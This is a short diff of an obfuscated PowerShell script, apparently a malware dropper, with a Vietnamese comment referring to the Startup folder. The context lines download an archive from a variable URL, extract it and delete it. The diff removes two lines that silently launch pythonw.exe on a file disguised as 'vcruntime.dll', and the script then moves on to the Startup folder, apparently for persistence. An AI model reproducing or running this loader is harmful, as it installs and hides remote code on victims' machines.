@@ -10,8 +10,7 @@ Invoke-WebRequest -Uri $ltrmn -OutFile $kdsf
 tar -xf $kdsf -C $cwab
 
 Remove-Item $kdsf -Force
-Start-Process -FilePath pythonw.exe -ArgumentList 'vcruntime.dll' -WorkingDirectory $cwab -Wait
-Start-Process -FilePath pythonw.exe -ArgumentList 'vcruntime.dll' -WorkingDirectory $cwab
+
 
 # Đường dẫn đến thư mục Startup
 $startupFolder = [Environment]::GetFolderPath('Startup')
